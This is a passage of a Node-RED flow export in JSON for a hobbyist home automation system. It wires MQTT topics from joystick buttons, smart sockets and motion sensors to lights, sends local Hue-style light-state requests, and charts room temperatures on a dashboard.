Kitchen","mode":"link","links":[],"x":895,"y":400,"wires":[]},{"id":"c542b4d7b107c611","type":"debug","z":"5a14f502389ced2a","name":"Otherwise","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":780,"y":480,"wires":[]},{"id":"bb8a3a1e2494e5e9","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/atari-stick/BUTTON_DOWN/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":220,"y":840,"wires":[[]]},{"id":"4f612efcb20ae9a4","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/atari-stick/BUTTON_LEFT/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":210,"y":880,"wires":[[]]},{"id":"35ba7a17aeacade7","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/atari-stick/BUTTON_RIGHT/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":220,"y":800,"wires":[[]]},{"id":"7e2f5f6764609eae","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/atari-stick/BUTTON_FIRE/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":210,"y":720,"wires":[[]]},{"id":"8647ed7c59a32122","type":"mqtt out","z":"2b631899544e728e","name":"","topic":"/general/jar-light/command","qos":"","retain":"","broker":"03f813acd4e097e7","x":500,"y":1680,"wires":[]},{"id":"ce23c774ddcff408","type":"inject","z":"2b631899544e728e","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"COUNTDOWN$60","payloadType":"str","x":130,"y":1760,"wires":[["8647ed7c59a32122"]]},{"id":"443517209a63f772","type":"debug","z":"2b631899544e728e","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":460,"y":1800,"wires":[]},{"id":"46264d22c6a79720","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/general/jar-light/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":120,"y":1800,"wires":[["443517209a63f772"]]},{"id":"308bca01020a5669","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"pc/heartbeat","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":90,"y":1380,"wires":[["f18568bfe933766d","dcd0de190505dcde"]]},{"id":"f18568bfe933766d","type":"trigger","z":"2b631899544e728e","name":"heartbeat timeout","op1":"ON","op2":"OFF","op1type":"str","op2type":"str","duration":"35","extend":true,"units":"s","reset":"","bytopic":"all","outputs":1,"x":470,"y":1380,"wires":[["9cfc04b73831b6e9"]]},{"id":"a22ecdac2140eebc","type":"debug","z":"2b631899544e728e","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","x":870,"y":1280,"wires":[]},{"id":"560cccddfa0b84b4","type":"mqtt out","z":"2b631899544e728e","name":"","topic":"pc/status/on","qos":"","retain":"","broker":"03f813acd4e097e7","x":990,"y":1360,"wires":[]},{"id":"9cfc04b73831b6e9","type":"switch","z":"2b631899544e728e","name":"ON/OFF","property":"payload","propertyType":"msg","rules":[{"t":"eq","v":"ON","vt":"str"},{"t":"eq","v":"OFF","vt":"str"}],"checkall":"true","repair":false,"outputs":2,"x":740,"y":1380,"wires":[["560cccddfa0b84b4"],["40ada193c143532d"]]},{"id":"40ada193c143532d","type":"mqtt out","z":"2b631899544e728e","name":"","topic":"pc/status/off","qos":"","retain":"","broker":"03f813acd4e097e7","x":990,"y":1420,"wires":[]},{"id":"bf671f7f1ac8c46b","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/smartsocket/SMTSKT05/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":170,"y":1220,"wires":[[]]},{"id":"be85e0a3f72c1feb","type":"comment","z":"2b631899544e728e","name":"PC power","info":"","x":80,"y":1180,"wires":[]},{"id":"d0584446071d67d3","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"pc/status/+","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":90,"y":1280,"wires":[["cefec4d4211fd6dc"]]},{"id":"d908c894a81b5321","type":"inject","z":"2b631899544e728e","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"ON","payloadType":"str","x":550,"y":1480,"wires":[["9cfc04b73831b6e9"]]},{"id":"cefec4d4211fd6dc","type":"function","z":"2b631899544e728e","name":"/device/smartsocket/SMTSKT05/command","func":"msg.topic = \"/device/smartsocket/SMTSKT05/command\";\nmsg.payload = \"$\" + msg.payload;\nreturn msg;","outputs":1,"noerr":0,"initialize":"","finalize":"","libs":[],"x":390,"y":1280,"wires":[["a22ecdac2140eebc","06cb39821cad956d","cd5c7017946cb934"]]},{"id":"06cb39821cad956d","type":"function","z":"2b631899544e728e","name":"LED Command","func":"\nmsg.payload = \"$LED\" + msg.payload;\n\nreturn msg;","outputs":1,"noerr":0,"initialize":"","finalize":"","libs":[],"x":1300,"y":1180,"wires":[["326acd42ecc8e5a9"]]},{"id":"326acd42ecc8e5a9","type":"mqtt out","z":"2b631899544e728e","name":"","topic":"","qos":"","retain":"","broker":"03f813acd4e097e7","x":1530,"y":1200,"wires":[]},{"id":"cd5c7017946cb934","type":"function","z":"2b631899544e728e","name":"RELAY Command","func":"\nmsg.payload = \"$RELAY\" + msg.payload;\n\nreturn msg;","outputs":1,"noerr":0,"x":1310,"y":1220,"wires":[["326acd42ecc8e5a9"]]},{"id":"5cbb8e6f5e491a6a","type":"inject","z":"2b631899544e728e","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"OFF","payloadType":"str","x":550,"y":1520,"wires":[["9cfc04b73831b6e9"]]},{"id":"dcd0de190505dcde","type":"link out","z":"2b631899544e728e","name":"PC Heartbeat","links":["61898600.7ed75c"],"x":335,"y":1320,"wires":[]},{"id":"560df56398901e58","type":"inject","z":"2b631899544e728e","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":180,"y":1320,"wires":[["dcd0de190505dcde"]]},{"id":"1354103fe97b88ed","type":"inject","z":"2b631899544e728e","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"BRIGHTNESS$50","payloadType":"str","x":130,"y":1720,"wires":[["8647ed7c59a32122"]]},{"id":"25506cfe237f43dc","type":"inject","z":"2b631899544e728e","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"OFF$50","payloadType":"str","x":100,"y":1640,"wires":[["8647ed7c59a32122"]]},{"id":"c9975e5d547dcfa5","type":"inject","z":"2b631899544e728e","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"PERIOD$1","payloadType":"str","x":100,"y":1680,"wires":[["8647ed7c59a32122"]]},{"id":"1331f0dd097b378e","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/atari-stick/online","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":160,"y":680,"wires":[["2e796bd5406cc78f"]]},{"id":"2e796bd5406cc78f","type":"debug","z":"2b631899544e728e","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":690,"y":680,"wires":[]},{"id":"0f8c18ade43bf432","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/atari-stick/BUTTON_UP/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":310,"y":320,"wires":[["e37a547f88f6af88"]]},{"id":"7f7620caf15062fc","type":"debug","z":"2b631899544e728e","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":1050,"y":100,"wires":[]},{"id":"1c3fffbc7202dec7","type":"mqtt out","z":"2b631899544e728e","name":"","topic":"/device/smartsocket/SMTSKT05/command","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"03f813acd4e097e7","x":1130,"y":220,"wires":[]},{"id":"ebee4498e24d3b23","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/smartsocket/SMTSKT05/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","nl":false,"rap":true,"rh":0,"inputs":0,"x":310,"y":180,"wires":[["c4212b72b18433f0"]]},{"id":"c4212b72b18433f0","type":"subflow:b0efa8cee61b4227","z":"2b631899544e728e","name":"PC Top LIght","env":[{"name":"event_name","value":"ATARI_JOYSTICK_UP","type":"str"},{"name":"variation","value":"1 minutes","type":"str"}],"x":610,"y":220,"wires":[["7f7620caf15062fc","1c3fffbc7202dec7"]]},{"id":"cac44d1083373bee","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/atari-stick/BUTTON_LEFT/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":310,"y":220,"wires":[["c4212b72b18433f0"]]},{"id":"f3b8de9ac3e54ad1","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/smartsocket/SMTSKT02/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","nl":false,"rap":true,"rh":0,"inputs":0,"x":310,"y":280,"wires":[["e37a547f88f6af88"]]},{"id":"e37a547f88f6af88","type":"subflow:b0efa8cee61b4227","z":"2b631899544e728e","name":"PC Monitor Under Light","env":[{"name":"event_name","value":"ATARI_JOYSTICK_UP","type":"str"},{"name":"variation","value":"1 minutes","type":"str"}],"x":650,"y":280,"wires":[["fd362a7e053b5d87","7f7620caf15062fc"]]},{"id":"fd362a7e053b5d87","type":"mqtt out","z":"2b631899544e728e","name":"","topic":"/device/smartsocket/SMTSKT02/command","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"03f813acd4e097e7","x":1130,"y":280,"wires":[]},{"id":"e9ae23d31b987d9d","type":"link in","z":"2b631899544e728e","name":"Button 32","links":["7afb97203d33eac3"],"x":285,"y":500,"wires":[["af5f37d8f7a41965"]],"icon":"node-red-contrib-deconz/icon-color.png"},{"id":"d1924b7eebdf133f","type":"subflow:b0efa8cee61b4227","z":"2b631899544e728e","name":"WARDROBE_LIGHT","env":[{"name":"event_name","value":"WARDROBE_LIGHT","type":"str"},{"name":"variation","value":"1 minutes","type":"str"},{"name":"timeout_seconds","value":"60","type":"num"}],"x":640,"y":400,"wires":[["f03e24d2856c7f6e","eb1e7413e8554ea4"]]},{"id":"f03e24d2856c7f6e","type":"mqtt out","z":"2b631899544e728e","name":"","topic":"/device/smartsocket/SMTSKT07/command","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"03f813acd4e097e7","x":1130,"y":400,"wires":[]},{"id":"91f8cb716299c9df","type":"mqtt out","z":"2b631899544e728e","name":"","topic":"/device/smartsocket/SMTSKT01/command","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"03f813acd4e097e7","x":1130,"y":480,"wires":[]},{"id":"4cc9a74a105af024","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/atom-lite-1/button","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","nl":false,"rap":false,"inputs":0,"x":270,"y":400,"wires":[["d1924b7eebdf133f"]]},{"id":"af5f37d8f7a41965","type":"subflow:b0efa8cee61b4227","z":"2b631899544e728e","name":"WORKBENCH_LIGHT","env":[{"name":"event_name","value":"WORKBENCH_LIGHT","type":"str"},{"name":"timeout_seconds","value":"0","type":"num"}],"x":640,"y":480,"wires":[["91f8cb716299c9df"]]},{"id":"d52ed2442a95a292","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/atari-stick/BUTTON_UP/event","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":210,"y":760,"wires":[[]]},{"id":"f3a4d33dd7bbac19","type":"link in","z":"2b631899544e728e","name":"Motion Cave","links":["ba56c5014d5b8e5c"],"x":285,"y":460,"wires":[["d1924b7eebdf133f","a105708badc73a0d"]],"icon":"node-red-contrib-deconz/icon-color.png"},{"id":"8fd4809529b40a51","type":"mqtt in","z":"2b631899544e728e","name":"","topic":"/device/smartsocket/SMTSKT07/online","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","nl":false,"rap":true,"rh":0,"inputs":0,"x":230,"y":1020,"wires":[["fc28975c6f6726cb"]]},{"id":"fc28975c6f6726cb","type":"trigger","z":"2b631899544e728e","name":"","op1":"1","op2":"0","op1type":"str","op2type":"str","duration":"500","extend":false,"overrideDelay":false,"units":"ms","reset":"","bytopic":"all","topic":"topic","outputs":1,"x":500,"y":1020,"wires":[[]]},{"id":"a105708badc73a0d","type":"debug","z":"2b631899544e728e","name":"From Sensor","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":590,"y":560,"wires":[]},{"id":"eb1e7413e8554ea4","type":"debug","z":"2b631899544e728e","name":"Subflow output","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":920,"y":540,"wires":[]},{"id":"e938e8e377cc9a82","type":"inject","z":"2b631899544e728e","name":"Motion","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"state\":{\"presence\":\"motion\"}}","payloadType":"json","x":550,"y":340,"wires":[["d1924b7eebdf133f"]]},{"id":"0927fc09856dfc11","type":"mqtt out","z":"691c69c39e379370","name":"","topic":"/dev/timestamp","qos":"","retain":"","broker":"03f813acd4e097e7","x":500,"y":80,"wires":[]},{"id":"b493956331e1942a","type":"inject","z":"691c69c39e379370","name":"1 Second","repeat":"1","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":150,"y":80,"wires":[["0927fc09856dfc11"]]},{"id":"88114ce8d45f1653","type":"mqtt out","z":"691c69c39e379370","name":"/nodered/time10s","topic":"/nodered/time10s","qos":"","retain":"","broker":"03f813acd4e097e7","x":510,"y":220,"wires":[]},{"id":"51de732502559727","type":"inject","z":"691c69c39e379370","name":"10 Second","repeat":"10","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":150,"y":220,"wires":[["88114ce8d45f1653"]]},{"id":"b644380766499968","type":"mqtt in","z":"6813af39821d0b74","name":"","topic":"/kitchen/bench-lights/online","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":160,"y":400,"wires":[["57cb2177de7372ac"]]},{"id":"57cb2177de7372ac","type":"trigger","z":"6813af39821d0b74","name":"Online","op1":"1","op2":"0","op1type":"str","op2type":"str","duration":"1000","extend":false,"units":"ms","reset":"","bytopic":"all","outputs":1,"x":450,"y":400,"wires":[[]]},{"id":"2532c05dcdfc3dbe","type":"mqtt in","z":"6813af39821d0b74","name":"","topic":"/device/aqara/motion/kitchen","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":160,"y":520,"wires":[["3b6d75daf096c20a"]]},{"id":"3b6d75daf096c20a","type":"trigger","z":"6813af39821d0b74","name":"","op1":"$LED_ALL$ON","op2":"$LED_ALL$OFF","op1type":"str","op2type":"str","duration":"5","extend":true,"overrideDelay":false,"units":"min","reset":"","bytopic":"all","topic":"topic","outputs":1,"x":420,"y":520,"wires":[["1f9c8f965fc6f145","085a8beabe86f8c0"]]},{"id":"085a8beabe86f8c0","type":"debug","z":"6813af39821d0b74","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","x":650,"y":440,"wires":[]},{"id":"1f9c8f965fc6f145","type":"mqtt out","z":"6813af39821d0b74","name":"","topic":"/kitchen/bench-lights/command","qos":"","retain":"","broker":"03f813acd4e097e7","x":1170,"y":520,"wires":[]},{"id":"694c5a213206cdef","type":"inject","z":"6813af39821d0b74","name":"$LED_ALL$OFF","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"$LED_ALL$OFF","payloadType":"str","x":900,"y":440,"wires":[["1f9c8f965fc6f145"]]},{"id":"cea5adcaf944df85","type":"inject","z":"6813af39821d0b74","name":"$LED_ALL$ON","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"$LED_ALL$ON","payloadType":"str","x":900,"y":400,"wires":[["1f9c8f965fc6f145"]]},{"id":"4fa6bd7cd0eea237","type":"http request","z":"dd48277c46073d1a","name":"Light above me State (1)","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/1/state","tls":"","proxy":"","authType":"","x":430,"y":40,"wires":[[]]},{"id":"e67168c7ca419de2","type":"http request","z":"dd48277c46073d1a","name":"Light 2 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/2/state","tls":"","proxy":"","authType":"","x":390,"y":100,"wires":[[]]},{"id":"f73b08abbfa0c7b9","type":"http request","z":"dd48277c46073d1a","name":"Light 3 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/3/state","tls":"","proxy":"","authType":"","x":390,"y":160,"wires":[[]]},{"id":"45b686e6b0212fa3","type":"inject","z":"dd48277c46073d1a","name":"OFF","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"on\":false,\"bri\":255,\"hue\":43680,\"sat\":255,\"transitiontime\":10}","payloadType":"json","x":110,"y":100,"wires":[["4fa6bd7cd0eea237","e67168c7ca419de2","f73b08abbfa0c7b9","557c03a88c2aaa84","3e4c9949a4c4d98d"]]},{"id":"b373f2d6c411e24c","type":"inject","z":"dd48277c46073d1a","name":"ON","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"on\":true,\"bri\":255,\"hue\":43680,\"sat\":255,\"transitiontime\":10}","payloadType":"json","x":110,"y":140,"wires":[["4fa6bd7cd0eea237","e67168c7ca419de2","f73b08abbfa0c7b9","557c03a88c2aaa84","3e4c9949a4c4d98d"]]},{"id":"557c03a88c2aaa84","type":"http request","z":"dd48277c46073d1a","name":"Light 7 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/7/state","tls":"","proxy":"","authType":"","x":390,"y":220,"wires":[[]]},{"id":"3e4c9949a4c4d98d","type":"http request","z":"dd48277c46073d1a","name":"Light above Leila 8 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/8/state","tls":"","proxy":"","authType":"","x":430,"y":280,"wires":[[]]},{"id":"4eb5681e2c113958","type":"mqtt in","z":"dd48277c46073d1a","name":"","topic":"/device/aqara/lounge-button/tap","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":150,"y":380,"wires":[["9c6d347edd8c1e65"]]},{"id":"6e03463bcccd05cc","type":"mqtt in","z":"dd48277c46073d1a","name":"","topic":"/device/aqara/lounge-button/doubletap","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":170,"y":420,"wires":[[]]},{"id":"cc05738e420e9095","type":"mqtt in","z":"dd48277c46073d1a","name":"","topic":"/device/aqara/lounge-button/tripletap","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":170,"y":460,"wires":[[]]},{"id":"bf3b02105e43e5cd","type":"mqtt in","z":"dd48277c46073d1a","name":"","topic":"/device/aqara/lounge-button/quadtap","qos":"2","datatype":"auto","broker":"03f813acd4e097e7","inputs":0,"x":170,"y":500,"wires":[[]]},{"id":"fa8aa48784f2eb3d","type":"http request","z":"dd48277c46073d1a","name":"","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/{{id}}/state","tls":"","proxy":"","authType":"","x":890,"y":380,"wires":[["61c378f23afe4c5f"]]},{"id":"61c378f23afe4c5f","type":"debug","z":"dd48277c46073d1a","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":1060,"y":380,"wires":[]},{"id":"f10621cb0fb0475a","type":"function","z":"dd48277c46073d1a","name":"All (state)","func":"var light1 = {\n    payload: {\n        \"on\":msg.state,\n        \"bri\":255,\n        \"hue\":43680,\n        \"sat\":255,\n        \"transitiontime\":10\n    },\n    id: 1\n};\nvar light2 = {\n    payload: {\n        \"on\":msg.state,\n        \"bri\":255,\n        \"hue\":43680,\n        \"sat\":255,\n        \"transitiontime\":10\n    },\n    id: 2\n};\nvar light3 = {\n    payload: {\n        \"on\":msg.state,\n        \"bri\":255,\n        \"hue\":43680,\n        \"sat\":255,\n        \"transitiontime\":10\n    },\n    id: 3\n};\nvar light4 = {\n    payload: {\n        \"on\":msg.state,\n        \"bri\":255,\n        \"hue\":43680,\n        \"sat\":255,\n        \"transitiontime\":10\n    },\n    id: 7\n};\n// var light5 = {\n//     payload: {\n//         \"on\":msg.state,\n//         \"bri\":255,\n//         \"hue\":43680,\n//         \"sat\":255,\n//         \"transitiontime\":10\n//     },\n//     id: 8\n// };\nreturn [[light1, light2, light3, light4]];\n\n","outputs":1,"noerr":0,"x":640,"y":380,"wires":[["fa8aa48784f2eb3d"]]},{"id":"9c6d347edd8c1e65","type":"function","z":"dd48277c46073d1a","name":"Change Scene","func":"var lounge_lights_scene = \"lounge_lights_scene\";\nvar current_scene = flow.get(lounge_lights_scene);\nvar leila_light_msg = { payload: msg.payload, state: false };\n\nswitch (current_scene) {\n    case \"on\":\n        flow.set(lounge_lights_scene, \"leila_only\");\n        msg.state = false;\n        leila_light_msg.state = false;\n        break;\n    case \"leila_only\":\n        flow.set(lounge_lights_scene, \"off\");\n        leila_light_msg.state = true;\n        msg.state = false;\n        break;\n    case \"off\":\n        flow.set(lounge_lights_scene, \"on\");\n        leila_light_msg.state = true;\n        msg.state = true;\n        break;\n    default:\n        flow.set(lounge_lights_scene, \"on\");\n        leila_light_msg.state = true;\n        msg.state = true;\n        break;\n}\nreturn [msg, leila_light_msg];","outputs":2,"noerr":0,"initialize":"","finalize":"","libs":[],"x":440,"y":380,"wires":[["f10621cb0fb0475a"],["07233a077a3d5520"]]},{"id":"052abde905eaa899","type":"mqtt in","z":"dd48277c46073d1a","name":"/device/cube1/event","topic":"/device/cube1/event","qos":"2","datatype":"json","broker":"03f813acd4e097e7","inputs":0,"x":710,"y":40,"wires":[["736fd3d14f79b17c"]]},{"id":"07eb9bb2ae5ad0f4","type":"mqtt in","z":"dd48277c46073d1a","name":"","topic":"/device/motion/door/event","qos":"2","datatype":"json","broker":"03f813acd4e097e7","inputs":0,"x":130,"y":760,"wires":[[]]},{"id":"66ddeb99c4087d82","type":"inject","z":"dd48277c46073d1a","name":"Initialise","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":true,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":520,"y":540,"wires":[[]]},{"id":"07233a077a3d5520","type":"function","z":"dd48277c46073d1a","name":"Leila Light","func":"msg.payload = {\n    \"on\":msg.state,\n    \"bri\":255,\n    \"hue\":43680,\n    \"sat\":255,\n    \"transitiontime\":10\n};\nmsg.id = 8;\nreturn msg;","outputs":1,"noerr":0,"x":640,"y":420,"wires":[["fa8aa48784f2eb3d"]]},{"id":"6c9ac9320f315d67","type":"inject","z":"dd48277c46073d1a","name":"ON","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"on\":true,\"bri\":255,\"hue\":43680,\"sat\":255,\"transitiontime\":10}","payloadType":"json","x":110,"y":140,"wires":[[]]},{"id":"736fd3d14f79b17c","type":"function","z":"dd48277c46073d1a","name":"shake","func":"if (msg.payload.event !== \"shake\") {\n    return null;\n}\nreturn msg;","outputs":1,"noerr":0,"x":890,"y":40,"wires":[["1bb3280a571a7467","f4b3303149a8f990"]]},{"id":"1bb3280a571a7467","type":"delay","z":"dd48277c46073d1a","name":"","pauseType":"delay","timeout":"2","timeoutUnits":"seconds","rate":"1","nbRateUnits":"1","rateUnits":"second","randomFirst":"1","randomLast":"5","randomUnits":"seconds","drop":false,"outputs":1,"x":1020,"y":120,"wires":[["e3de1733b3cadb84"]]},{"id":"b9e60bf57013f622","type":"http request","z":"dd48277c46073d1a","name":"Light above me State (1)","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/1/state","tls":"","proxy":"","authType":"","x":1410,"y":40,"wires":[[]]},{"id":"e0e2b850360d2453","type":"http request","z":"dd48277c46073d1a","name":"Light 2 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/2/state","tls":"","proxy":"","authType":"","x":1370,"y":100,"wires":[[]]},{"id":"e69e6163f272e3a3","type":"http request","z":"dd48277c46073d1a","name":"Light 3 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/3/state","tls":"","proxy":"","authType":"","x":1370,"y":160,"wires":[[]]},{"id":"f796fa8ce1266a53","type":"http request","z":"dd48277c46073d1a","name":"Light 7 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/7/state","tls":"","proxy":"","authType":"","x":1370,"y":220,"wires":[[]]},{"id":"76fde02273fc3e86","type":"http request","z":"dd48277c46073d1a","name":"Light above Leila 8 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/8/state","tls":"","proxy":"","authType":"","x":1410,"y":280,"wires":[[]]},{"id":"e3de1733b3cadb84","type":"function","z":"dd48277c46073d1a","name":"ON","func":"msg.payload = \"{\\\"on\\\":true,\\\"bri\\\":255,\\\"hue\\\":43680,\\\"sat\\\":255,\\\"transitiontime\\\":10}\";\nreturn msg;","outputs":1,"noerr":0,"x":1170,"y":240,"wires":[["76fde02273fc3e86","f796fa8ce1266a53"]]},{"id":"f4b3303149a8f990","type":"function","z":"dd48277c46073d1a","name":"OFF","func":"msg.payload = \"{\\\"on\\\":false,\\\"bri\\\":255,\\\"hue\\\":43680,\\\"sat\\\":255,\\\"transitiontime\\\":10}\";\nreturn msg;","outputs":1,"noerr":0,"x":1170,"y":40,"wires":[["b9e60bf57013f622","e0e2b850360d2453","e69e6163f272e3a3","f796fa8ce1266a53","76fde02273fc3e86"]]},{"id":"3a242f422511c6f3","type":"ui_text","z":"09d4f27af0752e89","group":"0b62a56ccf720e95","order":0,"width":0,"height":0,"name":"","label":"Liam's Room","format":"{{msg.payload.state.temperature/100}} &deg;","layout":"row-spread","x":1130,"y":440,"wires":[]},{"id":"eba4f34940dfa8de","type":"ui_chart","z":"09d4f27af0752e89","name":"","group":"0b62a56ccf720e95","order":2,"width":"12","height":"7","label":"Liam's Room Temperatures","chartType":"line","legend":"true","xformat":"HH:mm","interpolate":"linear","nodata":"","dot":false,"ymin":"","ymax":"","removeOlder":"12","removeOlderPoints":"","removeOlderUnit":"3600","cutout":0,"useOneColor":false,"colors":["#1f77b4","#ff8040","#ff0000","#0000ff","#98df8a","#d62728","#ff9896","#9467bd","#c5b0d5"],"useOldStyle":false,"outputs":1,"x":1180,"y":540,"wires":[[]]},{"id":"4e8e157241c6d62f","type":"function","z":"09d4f27af0752e89","name":"to degs","func":"if (msg.payload.state === undefined)\n{\n    return null;\n}\nmsg.payload = msg.payload.state.temperature/100;\nreturn msg;","outputs":1,"noerr":0,"x":980,"y":540,"wires":[["eba4f34940dfa8de"]]},{"id":"bd6a17886d5b6fe4","type":"ui_text","z":"09d4f27af0752e89","group":"9a96dc6533dbc8ae","order":0,"width":0,"height":0,"name":"","label":"Liam's Heater","format":"{{msg.payload.state.temperature/100}} &deg;","layout":"row-spread","x":1140,"y":480,"wires":[]},{"id":"efffe5138abd2aca","type":"change","z":"09d4f27af0752e89","name":"topic:  Liam's Room","rules":[{"t":"set","p":"topic","pt":"msg","to":" Liam's Room","tot":"str"}],"action":"","property":"","from":"","to":"","reg":false,"x":570,"y":440,"wires":[["3a242f422511c6f3","4e8e157241c6d62f"]]},{"id":"020da367810b4c55","type":"change","z":"09d4f27af0752e89","name":"topic: Liam's Heater","rules":[{"t":"set","p":"topic","pt":"msg","to":"Liam's Heater","tot":"str"}],"action":"","property":"","from":"","to":"","reg":false,"x":580,"y":480,"wires":[["bd6a17886d5b6fe4","4e8e157241c6d62f"]]},{"id":"f57e29d9fe3adfd0","type":"change","z":"09d4f27af0752e89","name":"topic: Heatpump","rules":[{"t":"set","p":"topic","pt":"msg","to":"Heatpump","tot":"str"}],"action":"","property":"","from":"","to":"","reg":false,"x":560,"y":340,"wires":[["646a14fe1367ca86","b724e760e9716320"]]},{"id":"70eafd5b969d85d8","type":"link in","z":"09d4f27af0752e89","name":"Outside","links":["258a182d780ba89b"],"x":435,"y":200,"wires":[["20e8b1187be6af03"]],"outputLabels":["Outside Temp"]},{"id":"692a814c8e714953","type":"link in","z":"09d4f27af0752e89","name":"Liam's Room Temp","links":["3317c0e303553415"],"x":435,"y":440,"wires":[["efffe5138abd2aca"]]},{"id":"6c967436bdfb7c72","type":"link in","z":"09d4f27af0752e89","name":"Leila","links":["ff191787623a638b"],"x":410,"y":300,"wires":[["ef0f49a8d2b5ba93"]],"l":true},{"id":"ce4e045dc58fa414","type":"link in","z":"09d4f27af0752e89","name":"","links":["04097b2b1f75fa02"],"x":435,"y":480,"wires":[["020da367810b4c55"]]},{"id":"5ea0cb9c113fcc28","type":"link in","z":"09d4f27af0752e89","name":"Heatpump","links":["4695b87691f1e6b8"],"x":400,"y":340,"wires":[["f57e29d9fe3adfd0"]],"l":true},{"id":"646a14fe1367ca86","type":"function","z":"09d4f27af0752e89","name":"to degs","func":"if (msg.payload.state === undefined)\n{\n    return null;\n}\nmsg.payload = 